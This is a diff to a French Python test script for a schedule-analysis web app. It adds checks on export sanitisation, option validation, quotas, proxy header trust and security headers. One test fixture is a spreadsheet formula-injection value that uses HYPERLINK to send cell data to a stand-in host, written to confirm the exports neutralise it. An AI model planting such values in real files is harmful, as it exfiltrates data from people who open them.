@@ -92,7 +92,7 @@ check("smoke test /healthz", "/healthz" in smoke)
 check("smoke test /app/data/usage.db", "/app/data/usage.db" in smoke)
 check("smoke test HEALTHCHECK", "State.Health.Status" in smoke)
 check("smoke test : score, exports, attente et arrêt couverts par la CI",
-      'class="card card-pad score"' in smoke and "export=csv" in smoke
+      'class="card score-hero"' in smoke and "export=csv" in smoke
       and "export=xlsx" in smoke and "annuler/" in smoke
       and 'id="waiting" hidden' in smoke and 'id="cancel-btn"' in smoke)
 check("smoke test : contrôle Log4j écrit sans piège « set -e »",
@@ -1164,6 +1164,152 @@ if temoin_lots and temoin_recap:
     check("export Excel : bloc de répartition par lot",
           "Répartition du risque par lot" in contenu and "Criticité (%)" in contenu
           and "Écart P50 vs planifié (j)" in contenu)
+
+
+# --------------------------------------------------------------------------
+section("Audit du 22/10/2026 : exports, quota, proxies, en-têtes, options")
+
+import html as _html  # noqa: E402
+from datetime import datetime as _dt, timedelta as _td, timezone as _tz  # noqa: E402
+
+_nom_piege = '=HYPERLINK("http://exemple.invalid/?"&A2,"ouvrir")'
+_sortie_piege = (
+    "SIMULATION MONTE CARLO — x\nTaches de detail : 2\nLiens de dependance : 1\n"
+    "Simulations : 10\nDuree deterministe (chemin critique, durees planifiees) : 20.0 j\n"
+    "P50 (mediane simulee)  : 22.0 j  (+2.0 j vs planifie)\n"
+    "P80                    : 24.0 j  (+4.0 j vs planifie)\n"
+    "P90                    : 25.0 j  (+5.0 j vs planifie)\n"
+    "Indice de criticite par tache (top 10 -- % de simulations sur le chemin critique) :\n"
+    f"  {_nom_piege}   100.0%\n  @SUM(1)   80.0%\n  http://lien.invalid   50.0%\n")
+_res_piege = [{"kind": "montecarlo", "parsed": app.parse_montecarlo_output(_sortie_piege)}]
+with zipfile.ZipFile(io.BytesIO(app.xlsx_export_payload(_res_piege, "p.mpp"))) as _z:
+    _feuille = _z.read("xl/worksheets/sheet1.xml").decode("utf-8")
+    _liens = [n for n in _z.namelist() if n.endswith("sheet1.xml.rels")]
+check("export Excel : un nom de tâche « =… » reste du texte (aucune formule)", "<f>" not in _feuille)
+check("export Excel : une URL dans un nom ne devient pas un lien", not _liens, f"={_liens}")
+_csv_piege = app.csv_export_payload(_res_piege, "p.mpp").decode("utf-8-sig")
+check("export CSV : noms « = » et « @ » neutralisés par une apostrophe",
+      "\"'=HYPERLINK" in _csv_piege and "'@SUM(1)" in _csv_piege)
+check("export CSV : les écarts signés restent des nombres",
+      app.neutraliser_formule("-1.5") == "-1.5" and app.neutraliser_formule("+4,0") == "+4,0")
+
+for _o, _p in (("nan", "nan"), ("0.8", "inf"), ("0.8", "50"), ("1.2", "1.5")):
+    try:
+        app.parse_montecarlo_options({"opt": _o, "pess": _p})
+        check(f"options : facteurs {_o} / {_p} refusés", False)
+    except ValueError:
+        check(f"options : facteurs {_o} / {_p} refusés", True)
+try:
+    app.parse_montecarlo_options({"sims": "50000"})
+    check("options : 50 000 simulations refusées (maximum du formulaire : 10 000)", False)
+except ValueError:
+    check("options : 50 000 simulations refusées (maximum du formulaire : 10 000)", True)
+
+check("créneaux : une analyse « les deux » n'est pas purgée avant 2 × délai",
+      app.slot_stale_seconds() >= 2 * app.TIMEOUT_SECONDS + 120, f"={app.slot_stale_seconds()}")
+_avant = (_dt.now(_tz.utc) - _td(seconds=app.TIMEOUT_SECONDS + 130)).isoformat()
+with sqlite3.connect(db) as conn:
+    conn.execute("DELETE FROM running")
+    conn.execute("INSERT INTO running (ip, started_at) VALUES (?, ?)", ("198.51.100.70", _avant))
+    conn.commit()
+check("créneaux : analyse longue en cours conservée (limite toujours appliquée)",
+      app.acquire_analysis_slot("198.51.100.71") is None)
+with sqlite3.connect(db) as conn:
+    conn.execute("DELETE FROM running")
+    conn.commit()
+
+_vrai_run = app.run_script
+
+
+def _compteur(ip):
+    with sqlite3.connect(db) as conn:
+        ligne = conn.execute("SELECT count FROM usage WHERE ip = ? AND date = ?",
+                             (ip, app.today_key())).fetchone()
+    return ligne[0] if ligne else 0
+
+
+def _poster(ip):
+    return client.post("/analyse", data={
+        "analysis": "both", "sims": "500",
+        "mpp_file": (io.BytesIO(b"<Project/>"), "planning.mpp")},
+        content_type="multipart/form-data", headers={"X-Forwarded-For": ip})
+
+
+try:
+    def _delai(cmd, label, token=None):
+        raise app.AnalysisError("L'analyse a dépassé le délai maximal.", consumed=True)
+    app.run_script = _delai
+    _r = _poster("203.0.113.120")
+    check("délai dépassé : décompté du quota (occupation non gratuite)",
+          _r.status_code == 400 and _compteur("203.0.113.120") == 1, f"={_compteur('203.0.113.120')}")
+    check("délai dépassé : le visiteur est prévenu du décompte",
+          "décomptée de votre quota" in _html.unescape(_r.get_data(as_text=True)))
+
+    _sortie_dcma = (STAGE / "ref_dcma.txt").read_text(encoding="utf-8")
+
+    def _arret_mc(cmd, label, token=None):
+        if "DCMA" in label:
+            return _sortie_dcma
+        raise app.AnalysisCancelled("stop")
+    app.run_script = _arret_mc
+    _page = _html.unescape(_poster("203.0.113.121").get_data(as_text=True))
+    check("arrêt pendant le Monte Carlo : le diagnostic terminé est annoncé décompté",
+          "déjà terminé, a été décompté" in _page and _compteur("203.0.113.121") == 1,
+          f"={_compteur('203.0.113.121')}")
+finally:
+    app.run_script = _vrai_run
+
+_filtre = app.ForwardedFromTrustedProxies(
+    lambda environ, start_response: environ.get("HTTP_X_FORWARDED_FOR"), {"192.168.1.141"})
+check("proxies de confiance : X-Forwarded-For ignoré hors proxy",
+      _filtre({"REMOTE_ADDR": "203.0.113.5", "HTTP_X_FORWARDED_FOR": "1.2.3.4"}, None) is None)
+check("proxies de confiance : X-Forwarded-For lu depuis le proxy",
+      _filtre({"REMOTE_ADDR": "192.168.1.141", "HTTP_X_FORWARDED_FOR": "1.2.3.4"}, None) == "1.2.3.4")
+check("proxies de confiance : sans liste, comportement historique",
+      app.ForwardedFromTrustedProxies(lambda e, s: e.get("HTTP_X_FORWARDED_FOR"), frozenset())(
+          {"REMOTE_ADDR": "203.0.113.5", "HTTP_X_FORWARDED_FOR": "1.2.3.4"}, None) == "1.2.3.4")
+
+_accueil = client.get("/")
+_csp = _accueil.headers.get("Content-Security-Policy", "")
+_jeton = re.search(r"'nonce-([^']+)'", _csp)
+check("en-têtes : CSP, nosniff, DENY, no-referrer",
+      "frame-ancestors 'none'" in _csp and _accueil.headers.get("X-Content-Type-Options") == "nosniff"
+      and _accueil.headers.get("X-Frame-Options") == "DENY"
+      and _accueil.headers.get("Referrer-Policy") == "no-referrer")
+check("en-têtes : le script de la page porte le jeton de la CSP",
+      bool(_jeton) and f'<script nonce="{_jeton.group(1)}">' in _accueil.get_data(as_text=True))
+
+# Scripts réels (MPXJ) sur test_liens.xml : deux chemins critiques parallèles de
+# 20 j en retard de 3 j, un lien début-début, un lien fin-fin, une contrainte SNLT.
+if (STAGE / "test_liens.xml").exists():
+    _dcma_liens = app.LOG4J_NOISE.sub("", subprocess.run(
+        [sys.executable, str(STAGE / "dcma14.py"), "test_liens.xml"],
+        cwd=str(STAGE), capture_output=True, text=True, timeout=300).stdout or "")
+    _lignes = {r["num"]: r for r in app.parse_dcma_output(_dcma_liens)["rows"]}
+    check("contrainte « début au plus tard le » (SNLT) comptée comme dure",
+          _lignes.get(5, {}).get("detail") == "1/7", f"={_lignes.get(5, {}).get('detail')}")
+    check("CPLI : chemins parallèles non additionnés, retard pris sur le pire (0,85)",
+          _lignes.get(13, {}).get("value") == "0.85", f"={_lignes.get(13, {}).get('value')}")
+    _mc_liens = app.LOG4J_NOISE.sub("", subprocess.run(
+        [sys.executable, str(STAGE / "montecarlo.py"), "test_liens.xml", "--sims", "200"],
+        cwd=str(STAGE), capture_output=True, text=True, timeout=300).stdout or "")
+    _mc = app.parse_montecarlo_output(_mc_liens)
+    _cpm = next((m["value_num"] for m in _mc["metrics"] if m["key"] == "deterministic"), None)
+    check("Monte Carlo : liens SS et FF respectés (CPM 22 j, et non 25 j)", _cpm == 22.0, f"={_cpm}")
+    _crit = {c["name"]: c["pct_num"] for c in _mc["criticality"]}
+    check("Monte Carlo : la tâche liée début-début avec marge n'est jamais critique",
+          _crit.get("B — debut-debut sur A") == 0.0, f"={_crit}")
+    _csv_mauvais = CHECK_DIR / "estimations_incoherentes.csv"
+    _csv_mauvais.write_text("task_id;optimistic;most_likely;pessimistic\n1;5;10;8\n", encoding="utf-8")
+    _refus = subprocess.run(
+        [sys.executable, str(STAGE / "montecarlo.py"), "test_liens.xml", "--sims", "50",
+         "--estimates", str(_csv_mauvais)],
+        cwd=str(STAGE), capture_output=True, text=True, timeout=300)
+    check("estimations : probable hors [optimiste, pessimiste] refusée avec motif",
+          _refus.returncode == 2 and "ESTIMATIONS_INVALIDES: ligne 2 (tache 1)" in _refus.stderr,
+          f"code {_refus.returncode} : {_refus.stderr[-160:]}")
+else:
+    check("fixture test_liens.xml présente", False, "absente")
 
 
 # --------------------------------------------------------------------------
